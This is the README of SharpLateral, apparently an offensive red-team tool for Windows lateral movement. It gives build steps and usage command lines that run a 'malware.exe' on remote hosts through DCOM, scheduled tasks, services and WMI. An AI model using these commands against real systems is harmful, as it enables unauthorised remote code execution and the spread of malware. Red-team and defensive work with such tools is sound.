# SharpLateral

## Compiling Project

Below 3rd party libraries are used in this project.

<b>TaskScheduler</b><br>https://github.com/dahall/TaskScheduler<br>
<b>Fody</b><br>	https://github.com/Fody/Fody<br><br>
Load the Visual Studio project up and go to "Tools" > "NuGet Package Manager" > "Package Manager Settings"<br>
Open "NuGet Package Manager" > "Package Sources"<br><br>
<b>Install the Fody</b><br>``Install-Package Costura.Fody -Version 3.3.3``<br><br>
<b>Install the Taskscheduler</b><br>``Install-Package TaskScheduler -Version 2.8.11``

## Usage

SharpLateral aims to perform lateral movement with the following methods:<br>

- DCOM
- SERVICE
- WMI
- SCHEDULED TASKS

  <br>DCOM:<br>
``SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe``<br>
Executes Malware on given hostname via MMC20
 <br>Scheduled Task:<br>
``SharpLateral schedule C:\Users\Administrator\Desktop\malware.exe TaskName``<br>
Creates Task,Executes Malware,Deletes Task<br>
<br>Service:<br>
``SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName``<br>
  Creates Service and executes malware with it
<br>WMI:<br>
 ``SharpLateral redwmi Client2 C:\\Users\\Administrator\\Desktop\\malware.exe``<br>
Executes malware via WMI on remote host




